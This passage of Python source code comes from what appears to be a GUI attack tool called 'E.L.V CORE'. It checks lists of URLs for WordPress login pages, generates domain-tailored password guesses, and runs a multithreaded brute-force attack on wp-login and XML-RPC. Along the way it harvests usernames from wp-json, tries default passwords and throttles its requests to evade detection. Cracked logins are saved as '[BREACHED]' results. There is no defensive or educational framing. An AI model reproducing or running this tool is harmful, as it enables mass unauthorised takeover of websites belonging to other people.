            url = normalize(url)
            try:
                r = requests.get(url + '/wp-login.php', timeout=timeout, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, verify=False)
                if r.status_code in [200, 302] and 'wordpress' in r.text.lower():
                    wp_url = url.rstrip('/') + '/wp-login.php'
                    self.log(f'[FOUND] {wp_url}', self.colors['fg_green'])
                    return wp_url
                else:
                    return None
            except Exception as e:
                return None
        try:
            with open(input_file, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
            total = len(urls)
            self.log(f'[CHECK WP-LOGIN] Loaded {total} URLs', self.colors['fg_cyan'])
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"# WP-login.php Check Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total URLs checked: {total}\n\n')
            found_count = 0
            processed = 0
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(check_wp, url): url for url in urls}
                for future in as_completed(futures):
                    if self.stop_flag:
                        break
                    result = future.result()
                    processed += 1
                    if result:
                        found_count += 1
                        with open(output_file, 'a', encoding='utf-8') as f:
                            f.write(result + '\n')
                    if processed % 50 == 0:
                        self.log(f'[PROGRESS] {processed}/{total} checked | Found: {found_count}', self.colors['fg_cyan'])
            self.log(f'[CHECK WP-LOGIN] Complete! Found {found_count}/{total} WordPress sites', self.colors['fg_green'])
            self.log(f'[CHECK WP-LOGIN] Results saved to: {output_file}', self.colors['fg_green'])
            messagebox.showinfo('Check Complete', f'Found {found_count}/{total} WordPress sites!\n\nResults saved to:\n{output_file}')
        except Exception as e:
            self.log(f'[ERROR] Check WP-login failed: {str(e)}', self.colors['fg_red'])
            messagebox.showerror('Error', f'Error checking WP-login: {str(e)}')

class BaseTab:

    def __init__(self, parent, colors, control_panel=None):
        self.parent = parent
        self.colors = colors
        self.control_panel = control_panel
        self.frame = tk.Frame(parent, bg=colors['bg'])

    def pack(self, **kwargs):
        self.frame.pack(**kwargs)

    def pack_forget(self):
        self.frame.pack_forget()

    def add_back_button(self):
        back_btn = tk.Button(self.frame, text='[BACK TO CONTROL PANEL]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=CYAN_NEON, activebackground=CYAN_NEON, activeforeground=CYAN_NEON, command=self.back_to_control_panel, width=30, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        back_btn.pack(anchor=tk.NW, padx=10, pady=10)

    def back_to_control_panel(self):
        if self.control_panel:
            self.pack_forget()
            for widget in self.control_panel.root.winfo_children():
                widget.pack_forget()
            self.control_panel.setup_control_panel()
            self.control_panel.current_tab = None
            self.control_panel.root.title('E.L.V CORE')

class GeneratePasswordTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.setup_tab()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='GENERATE PASSWORD', font=('Courier', 20, 'bold'), fg=self.colors['fg'], bg=self.colors['bg'])
        title.pack(pady=20)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        left_panel = tk.Frame(main_frame, bg=self.colors['bg'])
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=False, padx=(0, 10))
        left_panel.config(width=400)
        left_panel.pack_propagate(False)
        right_panel = tk.Frame(main_frame, bg=self.colors['bg'])
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        tk.Label(left_panel, text='Target URL or File:', font=('Courier', 9), fg=self.colors['fg_green'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        target_frame = tk.Frame(left_panel, bg=self.colors['bg'])
        target_frame.pack(fill=tk.X, pady=(0, 12))
        self.target_entry = tk.Entry(target_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1)
        self.target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3, padx=(0, 5))
        browse_btn = tk.Button(target_frame, text='Browse', font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['button_fg'], activebackground=self.colors['select_bg'], activeforeground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1, command=self.browse_target_file, width=8)
        browse_btn.pack(side=tk.RIGHT)
        generate_btn = tk.Button(left_panel, text='GENERATE PASSWORDS', font=('Courier', 11, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.generate_passwords, width=35, height=3, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        generate_btn.pack(pady=20)
        self.log_text = scrolledtext.ScrolledText(right_panel, font=('Courier', 9), bg=self.colors['text_bg'], fg=self.colors['fg_green'], wrap=tk.WORD, width=70, height=35, relief=tk.SOLID, borderwidth=1, insertbackground=self.colors['fg_green'])
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def browse_target_file(self):
        filename = filedialog.askopenfilename(title='Select Target File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, filename)

    def log(self, message, color=None):
        if color:
            self.log_text.insert(tk.END, message + '\n', color)
        else:
            self.log_text.insert(tk.END, message + '\n')
        self.log_text.see(tk.END)

    def generate_passwords(self):
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showerror('Error', 'Please enter a target URL or select a target file!')
            return
        self.log(f'[*] Starting password generation for: {target}', self.colors['fg_cyan'])
        if os.path.isfile(target):
            with open(target, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
        else:
            urls = [target]
        engine = ELVBruteforceEngine()
        all_passwords = set()
        for url in urls[:10]:
            try:
                parsed = urlparse(url)
                domain = parsed.netloc or parsed.path.split('/')[0]
                domain_info = engine.analyze_domain(domain)
                passwords = engine.generate_smart_passwords('admin', url, None, None, domain_info)
                all_passwords.update(passwords)
                self.log(f'[+] Generated {len(passwords)} passwords for {domain}')
            except Exception as e:
                self.log(f'[-] Error for {url}: {str(e)}', self.colors['fg_red'])
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'password_generate_{timestamp}.txt'
        with open(filename, 'w', encoding='utf-8') as f:
            for pwd in sorted(all_passwords):
                f.write(f'{pwd}\n')
        self.log(f'\n[+] Total unique passwords: {len(all_passwords)}', self.colors['fg_green'])
        self.log(f'[+] Saved to: {filename}', self.colors['fg_green'])
        messagebox.showinfo('Success', f'Generated {len(all_passwords)} passwords!\n\nSaved to:\n{filename}')

class WPBruteTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.results = []
        self.stats = {'total': 0, 'processed': 0, 'success': 0, 'failed': 0, 'skipped': 0}
        self.stats_lock = threading.Lock()
        self.stats_queue = queue.Queue()
        self.log_queue = queue.Queue()
        self.last_update_time = time.time()
        self.last_processed_count = 0
        self.progress_data = {}
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='WP BRUTE FORCE', font=('Courier', 20, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.Y, expand=False, padx=(5, 0))
        right_frame.config(width=420)
        right_frame.pack_propagate(False)
        self.setup_input_fields(left_frame)
        self.setup_log_area(left_frame)
        self.setup_results_area(left_frame)
        self.setup_stats(left_frame)
        self.setup_control_buttons(right_frame)

    def setup_input_fields(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_green'], highlightthickness=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='[TARGET CONFIGURATION]', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        fields_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        fields_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(fields_frame, text='Target (URL/File):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=0, column=0, sticky=tk.W, pady=3)
        self.target_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1)
        self.target_entry.grid(row=0, column=1, sticky=tk.EW, padx=(5, 0), pady=3)
        tk.Button(fields_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_target_file).grid(row=0, column=2, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Username (optional):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=1, column=0, sticky=tk.W, pady=3)
        self.username_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1)
        self.username_entry.grid(row=1, column=1, sticky=tk.EW, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Password (optional):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=2, column=0, sticky=tk.W, pady=3)
        self.password_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1, show='*')
        self.password_entry.grid(row=2, column=1, sticky=tk.EW, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Wordlist (optional):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=3, column=0, sticky=tk.W, pady=3)
        self.wordlist_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1)
        self.wordlist_entry.grid(row=3, column=1, sticky=tk.EW, padx=(5, 0), pady=3)
        tk.Button(fields_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_wordlist).grid(row=3, column=2, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Proxy (optional):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=4, column=0, sticky=tk.W, pady=3)
        self.proxy_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1)
        self.proxy_entry.grid(row=4, column=1, sticky=tk.EW, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=5, column=0, sticky=tk.W, pady=3)
        self.threads_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1, width=10)
        self.threads_entry.insert(0, '3')
        self.threads_entry.grid(row=5, column=1, sticky=tk.W, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Timeout (s):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=6, column=0, sticky=tk.W, pady=3)
        self.timeout_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1, width=10)
        self.timeout_entry.insert(0, '10')
        self.timeout_entry.grid(row=6, column=1, sticky=tk.W, padx=(5, 0), pady=3)
        fields_frame.columnconfigure(1, weight=1)
        self.debug_var = tk.BooleanVar()
        tk.Checkbutton(fields_frame, text='Debug Mode', font=('Courier', 9), variable=self.debug_var, bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).grid(row=7, column=0, columnspan=3, pady=3)

    def browse_target_file(self):
        filename = filedialog.askopenfilename(title='Select Target File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, filename)

    def browse_wordlist(self):
        filename = filedialog.askopenfilename(title='Select Wordlist File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.wordlist_entry.delete(0, tk.END)
            self.wordlist_entry.insert(0, filename)

    def setup_log_area(self, parent):
        log_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_cyan'], highlightthickness=1)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(log_frame, text='[ATTACK LOG]', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        log_text_frame = tk.Frame(log_frame, bg=self.colors['bg'])
        log_text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        scrollbar_log = tk.Scrollbar(log_text_frame)
        scrollbar_log.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text = tk.Text(log_text_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=0, wrap=tk.WORD, height=8, yscrollcommand=scrollbar_log.set)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar_log.config(command=self.log_text.yview)
        self.log_text.tag_config('green', foreground=self.colors['fg_green'])
        self.log_text.tag_config('cyan', foreground=self.colors['fg_cyan'])
        self.log_text.tag_config('yellow', foreground=self.colors['fg_yellow'])
        self.log_text.tag_config('red', foreground=self.colors['fg_red'])
        self.log_text.tag_config('purple', foreground=self.colors['fg_purple'])

    def setup_results_area(self, parent):
        results_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_green'], highlightthickness=1)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(results_frame, text='[BREACHED RESULTS]', font=('Courier', 10, 'bold'), fg=self.colors['fg_green'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        results_text_frame = tk.Frame(results_frame, bg=self.colors['bg'])
        results_text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        scrollbar_results = tk.Scrollbar(results_text_frame)
        scrollbar_results.pack(side=tk.RIGHT, fill=tk.Y)
        self.results_text = tk.Text(results_text_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], insertbackground=self.colors['fg_green'], relief=tk.FLAT, borderwidth=0, wrap=tk.WORD, height=5, yscrollcommand=scrollbar_results.set)
        self.results_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar_results.config(command=self.results_text.yview)
        self.results_text.tag_config('green', foreground=self.colors['fg_green'])
        self.results_text.tag_config('cyan', foreground=self.colors['fg_cyan'])
        self.results_text.tag_config('yellow', foreground=self.colors['fg_yellow'])
        self.results_text.tag_config('red', foreground=self.colors['fg_red'])

    def setup_stats(self, parent):
        stats_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_green'], highlightthickness=1)
        stats_frame.pack(fill=tk.X, pady=(0, 8))
        self.stats_label = tk.Label(stats_frame, text='[STATS] Total: 0 | Processed: 0 | Success: 0 | Failed: 0 | Skipped: 0', font=('Courier', 9, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=10, pady=6)
        self.stats_label.pack(fill=tk.X)
        self.progress_label = tk.Label(stats_frame, text='[STATUS] IDLE | [THREADS] 0 | [SPEED] 0 req/s', font=('Courier', 7), fg=self.colors['fg_cyan'], bg=self.colors['bg'], anchor=tk.W, padx=10, pady=5)
        self.progress_label.pack(fill=tk.X)

    def setup_control_buttons(self, parent):
        tk.Label(parent, text='[CONTROL PANEL]', font=('Courier', 9, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 6))
        button_container = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_green'], highlightthickness=2)
        button_container.pack(fill=tk.X, pady=(0, 8))
        button_frame = tk.Frame(button_container, bg=self.colors['bg'])
        button_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.start_button = tk.Button(button_frame, text='[>> START]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], relief=tk.RAISED, borderwidth=2, command=self.start_bruteforce, width=20, height=2, cursor='hand2', highlightbackground=self.colors['fg_green'], highlightthickness=1)
        self.start_button.pack(fill=tk.X, pady=4)
        self.stop_button = tk.Button(button_frame, text='[<< STOP]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], relief=tk.RAISED, borderwidth=2, command=self.stop_bruteforce, width=20, height=2, state=tk.DISABLED, cursor='hand2', highlightbackground=self.colors['fg_red'], highlightthickness=1)
        self.stop_button.pack(fill=tk.X, pady=4)
        self.clear_button = tk.Button(button_frame, text='[XX CLEAR]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_yellow'], relief=tk.RAISED, borderwidth=2, command=self.clear_logs, width=20, height=2, cursor='hand2', highlightbackground=self.colors['fg_yellow'], highlightthickness=1)
        self.clear_button.pack(fill=tk.X, pady=4)
        self.save_button = tk.Button(button_frame, text='[$$ SAVE]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], relief=tk.RAISED, borderwidth=2, command=self.save_results, width=20, height=2, cursor='hand2', highlightbackground=self.colors['fg_cyan'], highlightthickness=1)
        self.save_button.pack(fill=tk.X, pady=4)

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg, color)
                self.log_text.see(tk.END)
                lines = int(self.log_text.index('end-1c').split('.')[0])
                if lines > 100:
                    self.log_text.delete(1.0, f'{lines - 50}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats_update = self.stats_queue.get_nowait()
                self.stats.update(stats_update)
                stats_text = f"[STATS] Total: {self.stats['total']} | Processed: {self.stats['processed']} | Success: {self.stats['success']} | Failed: {self.stats['failed']} | Skipped: {self.stats['skipped']}"
                self.stats_label.config(text=stats_text)
                if hasattr(self, 'progress_data') and self.progress_data:
                    progress = self.progress_data
                    status = progress.get('status', 'RUNNING')
                    threads = progress.get('threads', 0)
                    speed = progress.get('speed', 0)
                    self.progress_label.config(text=f'[STATUS] {status} | [THREADS] {threads} | [SPEED] {speed} req/s')
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

    def clear_logs(self):
        self.log_text.delete(1.0, tk.END)
        self.results_text.delete(1.0, tk.END)
        self.log('Log cleared', 'fg_cyan')

    def start_bruteforce(self):
        if self.is_running:
            return
        target = self.target_entry.get().strip()
        username = self.username_entry.get().strip()
        password = self.password_entry.get().strip()
        wordlist = self.wordlist_entry.get().strip()
        proxy = self.proxy_entry.get().strip()
        try:
            threads = int(self.threads_entry.get().strip() or '3')
            threads = min(threads, 5)
        except:
            threads = 3
        try:
            timeout = int(self.timeout_entry.get().strip() or '10')
        except:
            timeout = 10
        if not target:
            messagebox.showerror('Error', 'Please enter a target URL or select a target file!')
            return
        targets = []
        if os.path.isfile(target):
            try:
                with open(target, 'r', encoding='utf-8') as f:
                    targets = [line.strip() for line in f if line.strip()]
            except Exception as e:
                messagebox.showerror('Error', f'Error reading target file: {str(e)}')
                return
        else:
            targets = [target]
        if not targets:
            messagebox.showerror('Error', 'No valid targets found!')
            return
        self.is_running = True
        self.stop_flag = False
        self.results = []
        self.stats = {'total': len(targets), 'processed': 0, 'success': 0, 'failed': 0, 'skipped': 0}
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        self.results_file = f'bruteforce_results_{timestamp}.txt'
        self.results_url_file = f'bruteforce_urls_{timestamp}.txt'
        try:
            with open(self.results_url_file, 'w', encoding='utf-8') as f:
                f.write(f"# Brute Force Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Format: wp-login.php#username@password\n\n')
        except:
            pass
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.results_text.delete(1.0, tk.END)
        self.log(f'[START] {len(targets)} targets | {threads} threads', 'fg_green')
        self.log(f'[AUTO-SAVE] Results will be saved to: {self.results_url_file}', 'fg_cyan')
        thread = threading.Thread(target=self.bruteforce_worker, args=(targets, username, password, wordlist, proxy, threads, timeout), daemon=True)
        thread.start()

    def stop_bruteforce(self):
        self.stop_flag = True
        self.log('[STOP] Attack halted', 'fg_yellow')
        self.progress_label.config(text='[STATUS] STOPPED | [THREADS] 0 | [SPEED] 0 req/s')

    def bruteforce_worker(self, targets, username, password, wordlist, proxy, threads, timeout):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        engine = ELVBruteforceEngine()
        if proxy:
            engine.set_proxy(proxy)
        self.last_update_time = time.time()
        self.last_processed_count = 0

        def bruteforce_target(original_url):
            if self.stop_flag:
                return
            credentials_from_url = engine.extract_credentials_from_url(original_url)
            if credentials_from_url:
                cred_username = credentials_from_url['username']
                cred_password = credentials_from_url['password']
                self.log(f'[URL-CREDS] Found credentials in URL: {cred_username}@{cred_password[:10]}...', 'fg_cyan')
                normalized_url = engine.normalize_url(original_url)
                try:
                    result = engine.test_login(normalized_url, cred_username, cred_password, timeout)
                    if result and result.get('success'):
                        self.log(f'[SUCCESS] {normalized_url} | {cred_username}:{cred_password}', 'fg_green')
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            self.stats['success'] += 1
                            self.stats_queue.put({'processed': self.stats['processed'], 'success': self.stats['success']})
                        login_url = f'{normalized_url}/wp-login.php#{cred_username}@{cred_password}'
                        try:
                            if hasattr(self, 'results_url_file') and self.results_url_file:
                                with open(self.results_url_file, 'a', encoding='utf-8') as f:
                                    f.write(f'{login_url}\n')
                        except:
                            pass
                        result_text = f'[BREACHED] {normalized_url} | User: {cred_username} | Pass: {cred_password} | Method: URL-FRAGMENT\n'
                        self.frame.after_idle(lambda rt=result_text: self.results_text.insert(tk.END, rt, 'green'))
                        self.frame.after_idle(lambda: self.results_text.see(tk.END))
                        self.results.append({'url': normalized_url, 'username': cred_username, 'password': cred_password, 'method': 'URL-FRAGMENT'})
                        return
                    else:
                        self.log(f'[FAILED] URL credentials invalid for {normalized_url}', 'fg_yellow')
                except:
                    pass
            url = engine.normalize_url(original_url)
            try:
                usernames = []
                try:
                    usernames = engine.get_usernames_from_wpjson(url, timeout)
                    if usernames:
                        self.log(f'[WP-JSON] Found usernames: {usernames}', 'fg_green')
                except:
                    usernames = []
                if not usernames:
                    try:
                        smart_usernames = engine.generate_smart_usernames(url)
                        if username:
                            usernames = [username] + smart_usernames[:10]
                        else:
                            usernames = smart_usernames[:15]
                        self.log(f'[FALLBACK] Using generated usernames: {usernames[:5]}...', 'fg_yellow')
                    except:
                        usernames = ['admin', 'administrator', 'user', 'test']
                if not usernames:
                    with self.stats_lock:
                        self.stats['processed'] += 1
                        self.stats['skipped'] += 1
                        self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                    return
                try:
                    if not engine.check_xmlrpc(url, timeout):
                        self.log(f'[SKIP] {url} - No XML-RPC', 'fg_yellow')
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            self.stats['skipped'] += 1
                            self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                        return
                except:
                    with self.stats_lock:
                        self.stats['processed'] += 1
                        self.stats['skipped'] += 1
                        self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                    return
                try:
                    if not engine.check_wp_login(url, timeout):
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            self.stats['skipped'] += 1
                            self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                        return
                except:
                    with self.stats_lock:
                        self.stats['processed'] += 1
                        self.stats['skipped'] += 1
                        self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
                    return
                try:
                    domain_info = engine.analyze_domain(url)
                    context_data = {}
                except:
                    domain_info = {}
                    context_data = {}
                failed_passwords = []
                total_attempts = 0
                max_attempts = 200
                for uname in usernames:
                    if self.stop_flag:
                        return
                    try:
                        if password:

                            def password_gen():
                                try:
                                    yield password
                                except GeneratorExit:
                                    return
                            user_passwords_gen = password_gen()
                            total_passwords = 1
                        elif wordlist:

                            def wordlist_gen():
                                try:
                                    with open(wordlist, 'r', encoding='utf-8') as f:
                                        count = 0
                                        for line in f:
                                            if self.stop_flag:
                                                break
                                            pwd = line.strip()
                                            if pwd and count < max_attempts:
                                                yield pwd
                                                count += 1
                                except GeneratorExit:
                                    return
                                except:
                                    for pwd in engine.generate_smart_passwords(uname, url, failed_passwords, context_data, domain_info)[:max_attempts]:
                                        if self.stop_flag:
                                            break
                                        yield pwd
                            try:
                                with open(wordlist, 'r', encoding='utf-8') as f:
                                    total_passwords = min(sum((1 for _ in f)), max_attempts)
                            except:
                                total_passwords = max_attempts
                            user_passwords_gen = wordlist_gen()
                        else:
                            passwords_list = engine.generate_smart_passwords(uname, url, failed_passwords, context_data, domain_info)[:max_attempts]
                            total_passwords = len(passwords_list)

                            def smart_passwords_gen():
                                for pwd in passwords_list:
                                    yield pwd
                            user_passwords_gen = smart_passwords_gen()
                        if not password and (not wordlist) and (total_passwords == 0):
                            passwords_list = ['admin', 'password', '123456', 'admin123', 'password123']
                            total_passwords = len(passwords_list)

                            def fallback_gen():
                                try:
                                    for pwd in passwords_list:
                                        if self.stop_flag:
                                            break
                                        yield pwd
                                except GeneratorExit:
                                    return
                            user_passwords_gen = fallback_gen()
                    except:
                        passwords_list = ['admin', 'password', '123456', 'admin123', 'password123']
                        total_passwords = len(passwords_list)

                        def fallback_gen():
                            try:
                                for pwd in passwords_list:
                                    if self.stop_flag:
                                        break
                                    yield pwd
                            except GeneratorExit:
                                return
                        user_passwords_gen = fallback_gen()
                    if total_passwords > 0:
                        self.log(f'[BRUTE] {url} | User: {uname} | Passwords: {total_passwords}', 'fg_cyan')
                    attempts = 0
                    try:
                        for pwd in user_passwords_gen:
                            if self.stop_flag:
                                return
                            if attempts >= max_attempts:
                                break
                            attempts += 1
                            total_attempts += 1
                            if attempts % 50 == 0:
                                self.log(f'[TRY] {url} | {uname} | Attempt {attempts}/{total_passwords}', 'fg_cyan')
                            if attempts % 3 == 0 and attempts > 0:
                                time.sleep(0.5)
                            try:
                                success, _ = engine.test_login(url, uname, pwd, timeout)
                            except:
                                success = False
                            if attempts % 50 == 0:
                                try:
                                    import gc
                                    gc.collect()
                                except:
                                    pass
                            try:
                                current_time = time.time()
                                if current_time - self.last_update_time >= 0.5:
                                    with self.stats_lock:
                                        try:
                                            time_diff = current_time - self.last_update_time
                                            speed = int((self.stats['processed'] - self.last_processed_count) / time_diff) if time_diff > 0 else 0
                                        except:
                                            speed = 0
                                        try:
                                            self.stats_queue.put({'processed': self.stats['processed'], 'success': self.stats['success'], 'failed': self.stats['failed'], 'skipped': self.stats['skipped']})
                                        except:
                                            pass
                                        try:
                                            self.progress_data = {'threads': threads, 'speed': speed, 'attempts': attempts}
                                        except:
                                            pass
                                    self.last_update_time = current_time
                                    self.last_processed_count = self.stats['processed']
                            except:
                                pass
                            if success:
                                result = {'url': url, 'username': uname, 'password': pwd, 'status': 'SUCCESS', 'attempts': attempts}
                                with self.stats_lock:
                                    self.results.append(result)
                                    self.stats['processed'] += 1
                                    self.stats['success'] += 1
                                    self.stats_queue.put({'processed': self.stats['processed'], 'success': self.stats['success']})
                                login_url = f'{url}/wp-login.php#{uname}@{pwd}'
                                try:
                                    if hasattr(self, 'results_url_file') and self.results_url_file:
                                        with open(self.results_url_file, 'a', encoding='utf-8') as f:
                                            f.write(f'{login_url}\n')
                                except:
                                    pass
                                self.log(f'[!!! BREACH SUCCESSFUL !!!] {url} | {uname}:{pwd} | Attempts: {attempts}', 'fg_green')
                                result_text = f'[BREACHED] {url} | User: {uname} | Pass: {pwd} | Attempts: {attempts}\n'
                                self.frame.after_idle(lambda rt=result_text: self.results_text.insert(tk.END, rt, 'green'))
                                self.frame.after_idle(lambda: self.results_text.see(tk.END))
                                self.progress_data = {'threads': threads, 'speed': 0, 'attempts': attempts, 'status': 'BREACHED!'}
                                return
                            elif pwd not in failed_passwords:
                                failed_passwords.append(pwd)
                    except GeneratorExit:
                        return
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats['failed'] += 1
                    self.stats_queue.put({'processed': self.stats['processed'], 'failed': self.stats['failed']})
